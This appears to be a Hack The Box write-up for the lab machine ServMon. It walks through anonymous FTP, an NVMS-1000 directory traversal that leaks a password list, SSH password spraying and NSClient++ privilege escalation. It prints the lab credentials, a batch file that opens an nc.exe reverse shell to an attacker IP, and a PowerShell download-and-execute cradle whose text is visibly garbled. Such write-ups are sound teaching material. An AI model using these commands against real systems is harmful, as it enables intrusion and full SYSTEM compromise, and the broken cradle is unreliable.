---
title: ServMon
date: 2026-08-27
description: Easy Windows machine combining anonymous FTP with an NVMS-1000 directory traversal — recovering a password list through LFI, spraying it for SSH access, and abusing an internet-exposed NSClient++ instance for a SYSTEM shell.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Tue Aug 25 08:48:26 2026 as: /usr/lib/nmap/nmap -p21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 -A -oN scan_results.txt 10.129.227.77
Nmap scan report for servmon.htb (10.129.227.77)
Host is up (0.69s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </scr​ipt>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: "Site doesn't have a title" (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.98%I=7%D=8/25%Time=6A8D8F23%P=aarch64-unknown-linux-gnu%
SF:r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\
SF:r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x2
SF:01\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/199
SF:9/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20
SF:\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x
SF:20\x20</scr​ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTP
SF:Options,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCo
SF:ntent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\x
SF:ef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0
SF:\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tr
SF:ansitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xht
SF:ml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<
SF:script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x2
SF:0</scr​ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPReque
SF:st,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent
SF:-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xb
SF:b\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20T
SF:ransitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transit
SF:ional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">
SF:\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<scrip
SF:t\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20windo
SF:w\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</sc
SF:ript>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(X11Probe,6B,"H
SF:TTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.98%T=SSL%I=7%D=8/25%Time=6A8D8F2E%P=aarch64-unknown-li
SF:nux-gnu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLo
SF:cation:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\xd0\xaf\xb1\x87\xfb\x7f\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\
SF:x04jobs\x12\x02\x18\x15\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\
SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRe
SF:quest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20
SF:not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2
SF:018\r\n\r\nDocument\x20not\x20found");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2012|2022|2016|Longhorn (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1909 - 2004 (89%), Microsoft Windows 10 20H2 (89%), Windows Server 2019 (89%), Microsoft Windows Server 2012 R2 (88%), Microsoft Windows Server 2022 (88%), Microsoft Windows 10 20H2 - 21H1 (86%), Microsoft Windows 10 21H2 (86%), Microsoft Windows Server 2012 or Server 2012 R2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-24T12:55:17
|_  start_date: N/A
|_clock-skew: -23h56m15s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   644.57 ms 10.10.16.1
2   346.15 ms servmon.htb (10.129.227.77)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 25 08:52:06 2026 -- 1 IP address (1 host up) scanned in 219.68 seconds
```
Retrieved FTP content through anonymous login:

```sh
> prompt off
> mget -R *
```

```text
servmon.htb
└── Users
    ├── Nadine
    │   └── Confidential.txt
    └── Nathan
        └── Notes to do.txt

4 directories, 2 files

```

A juicy filename — **Passwords.txt** on Nathan's desktop:

```Confidential-txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

# User

## NVMS-1000 LFI

The web service on port `80` turned out to be **NVMS-1000**.

> CVE-2019-20085: local file inclusion
>
> Referral links:
> - https://github.com/0hmsec/NVMS-1000-Directory-Traversal-Bash
> - https://www.exploit-db.com/exploits/48311

The traversal reached Nathan's password list:

```text
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Sprayed both users — SSH login as **Nadine**:

> `nadine - L1k3B1gBut7s@W0rk`

# Root

One more web service ran on port `8443`:

> `NSClient++`

Verified under **Program Files** — and the password is readable from `nsclient.ini`, or directly:

```powershell
PS C:\Program Files\NSClient++> ./nscp.exe web password --display
```

```text
ew2x6SsGTxjRwXOT
```

> **Additional info** — the password works only when forwarded locally, since the service allows **localhost** only.

Version check:

```powershell
PS C:\Program Files\NSClient++> ./nscp.exe --version
```

> NSClient++ version: 0.5.2.35 - **vulnerable**
>
> reference:
> https://sploitus.com/exploit?id=1337DAY-ID-32660
> https://www.exploit-db.com/exploits/46802

A direct login returns 403 — the panel only accepts `127.0.0.1`. Port-forward it over SSH:

```sh
ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb
```

> **Note** — Don't use `localhost` in the forward target even though the panel mentions it; use `127.0.0.1`.

Access the forwarded port from your own browser, log in with the password, and follow the reference's instructions. Confirmed both required modules were **enabled**.

Uploaded two files to the **temp** directory — `nc.exe` and `evil.bat`:

```text
evil.bat
@echo off
c:\temp\nc.exe 10.10.15.32 443 -e cmd.exe
```

Then configured a new external script section:
- Added the key/value with the script path pointing at **evil.bat**
- Scheduler: command = `lol`, interval = `1m`
- Saved the configuration and restarted the service from the control panel

**Summary**:
- Download a script and set its path to **evil.bat**, which gets executed
- Schedule the section to run every **1 minute** — it starts executing once the system restarts

The script ran as admin because **NSClient++** is monitoring software that deliberately runs as **NT authority\system** — catching the reverse shell on the listening port as `nt authority\system`.

Gained `root`

---

**Additional info**:

- Priv esc options were slim — few privileges available on the account

> Reference for ACL: https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/

- Execute an uploaded ACL script directly in memory once downloaded:

```powershell
$h=New-object -Comobject Msxm12. XMLHTTP; $h. open('GET', 'http://10.10.14.2:8000/Get-ServiceACL.ps1',$false);$h.sendO;iex $h.responseText
```

- Examine the service with Get-ServiceAcl:

```sh
"nscp" | Get-ServiceAcl | select -ExpandProperty Access
```

Without sufficient privilege, the information couldn't be fetched.

---

**Alternatives**: `sc.exe query nscp`, `Get-Service nscp`
